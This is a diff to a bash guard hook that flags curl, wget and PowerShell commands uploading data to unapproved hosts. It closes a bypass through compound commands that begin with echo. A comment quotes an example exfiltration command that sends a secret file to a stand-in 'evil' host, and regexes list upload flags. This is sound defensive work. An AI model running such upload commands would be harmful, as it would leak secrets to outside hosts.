@@ -26,10 +26,17 @@ fi
 [ -z "$raw" ] && exit 0
 
 # A command whose whole job is to PRINT the pattern (documentation, an echo, a comment) is
-# not executing it. Skip when the first word is a printer/comment.
+# not executing it. Skip when the first word is a printer/comment -- but ONLY for a simple
+# command. A compound command (echo ok; curl -d @secret https://evil) can hide an upload in
+# a later segment, so if a separator is present we do NOT trust the first word and inspect.
 first="$(printf '%s' "$raw" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]].*//')"
-case "$first" in
-    echo | printf | print | : | \#*) exit 0 ;;
+case "$raw" in
+    *[\;\&\|]* | *"$(printf '\n')"*) : ;;  # compound -> inspect, do not skip on first word
+    *)
+        case "$first" in
+            echo | printf | print | : | \#*) exit 0 ;;
+        esac
+        ;;
 esac
 
 # A human-approved exception says so on the line, visibly.
@@ -48,14 +55,30 @@ fetch_re='(^|[[:space:];|&(<])(curl|wget|iwr|invoke-webrequest|invoke-restmethod
 
 # Upload intent -- the thing that turns a fetch into an exfiltration. Fetch-only (a bare GET)
 # is left alone: the target is upload/POST to an unapproved host, not normal dependency traffic.
-#   curl:  -d/--data*/-F/--form/-T/--upload-file, -X|--request POST|PUT|PATCH
+#   curl:  -d/--data*/-F/--form/-T/--upload-file, -X|--request POST|PUT|PATCH -- incl. attached
+#          values (-d@file, -Tbackup.tar). curl short flags are CASE-SENSITIVE (-d != -D dump-
+#          header, -F != -f fail, -T != -t), so this half is matched with nocasematch OFF.
 #   wget:  --post-data/--post-file/--body-data/--body-file/--method= POST|PUT
-#   PS:    -Method POST|PUT|PATCH, -Body, -InFile, -Form
-upload_re='(-d[[:space:]]|--data([[:space:]]|-)|[[:space:]]-F[[:space:]]|--form[[:space:]]|[[:space:]]-T[[:space:]]|--upload-file|--post-data|--post-file|--body-data|--body-file|(-X|--request|--method[[:space:]=])[[:space:]=]*(POST|PUT|PATCH)|-Method[[:space:]]+(POST|PUT|PATCH)|-Body[[:space:]]|-InFile[[:space:]]|-Form[[:space:]])'
-[[ "$raw" =~ $upload_re ]] || {
+#   PS:    -Method POST|PUT|PATCH, -Body, -InFile, -Form -- PowerShell is case-insensitive, so
+#          that half keeps nocasematch ON.
+posix_upload_re='(^|[[:space:]])-[dFT]([[:space:]@]|[^[:space:]-])|--data([[:space:]]|-)|--form[[:space:]]|--upload-file|--post-data|--post-file|--body-data|--body-file|(-X|--request)[[:space:]]+(POST|PUT|PATCH)|--method[[:space:]=]+(POST|PUT|PATCH)'
+ps_upload_re='(-Method[[:space:]]+(POST|PUT|PATCH)|-Body([[:space:]]|$)|-InFile([[:space:]]|$)|-Form([[:space:]]|$))'
+
+# curl/wget half: nocasematch OFF so -d != -D, -F != -f, -T != -t (a fetch flag is not an upload).
+shopt -u nocasematch 2>/dev/null || true
+uploads=1
+[[ "$raw" =~ $posix_upload_re ]] || uploads=0
+# PowerShell half: nocasematch ON (the shell and its parameters are case-insensitive).
+if [ "$uploads" -eq 0 ]; then
+    shopt -s nocasematch 2>/dev/null || true
+    [[ "$raw" =~ $ps_upload_re ]] && uploads=1
+fi
+if [ "$uploads" -eq 0 ]; then
     shopt -u nocasematch 2>/dev/null || true
     exit 0
-}
+fi
+# nocasematch ON from here so host comparison is case-insensitive.
+shopt -s nocasematch 2>/dev/null || true
 
 _host_allowed() {
     local host="$1" a
